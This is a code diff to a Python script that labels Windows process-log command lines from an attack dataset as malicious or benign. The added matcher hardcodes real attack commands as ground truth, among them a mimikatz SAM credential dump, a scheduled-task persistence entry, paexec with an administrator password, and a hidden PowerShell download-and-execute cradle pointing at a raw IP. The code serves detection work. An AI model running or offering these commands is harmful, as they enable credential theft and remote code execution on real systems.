@@ -8,6 +8,7 @@ import hashlib
 import html
 import io
 import json
+import ntpath
 import re
 import subprocess
 import sqlite3
@@ -588,6 +589,25 @@ def windows_apt(root, options):
             )
 
 
+def _publicarena_attack(config, text):
+    parsed = normalize(text, os="windows")
+    if not parsed:
+        return False
+    program, args = parsed[0]
+    program = ntpath.basename(program).lower().removesuffix(".exe")
+    step = Path(config).stem
+    if step == "F12":
+        return program == "mimikatz" and args == ["lsadump:sam"]
+    if step == "F5":
+        return program == "schtasks" and args == ["/create", "/tn", "test", "/tr", r"C:\Users\Public\logic.exe", "/sc", "onlogon"]
+    prefix = [r"\192.168.0.110", "-u", "administrator", "-p", "Data123456!"]
+    if step == "F15onHostA-paexecip":
+        return program == "paexec" and args == [*prefix, "ipconfig"]
+    if step == "F16onHostA-paexecdown":
+        return program == "paexec" and args == [*prefix, "powershell.exe", "-nop", "-w", "hidden", "-c", "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8900/a'))"]
+    return False
+
+
 def publicarena(root, options):
     """Stream split archives through 7-Zip and match attack-step time windows."""
     truth = []
@@ -643,6 +663,7 @@ def publicarena(root, options):
                     # Match the same unzoned local wall times used by the attack configs.
                     date = datetime.strptime(row["date"], "%m/%d/%Y %H:%M:%S")  # noqa: DTZ007
                     pname = str(row.get("PName", "")).lower().removesuffix(".exe")
+                    text = html.unescape(row["CommandLine"]).replace("\\\\", "\\")
                     for target, start, end, programs, config in truth:
                         if (
                             target == host
@@ -653,6 +674,8 @@ def publicarena(root, options):
                                 "malicious-group",
                                 f"publicarena:{host}:{config}",
                             )
+                            if _publicarena_attack(config, text):
+                                label, group = "malicious", None
                             break
                     session = (
                         f"publicarena:{path.stem}:{row.get('pc', host)}:"
@@ -660,7 +683,7 @@ def publicarena(root, options):
                     )
                     rid = f"{path.name}:{name}:{row.get('uuid', index)}"
                     yield from emitted(
-                        html.unescape(row["CommandLine"]).replace("\\\\", "\\"),
+                        text,
                         rid,
                         session,
                         label,
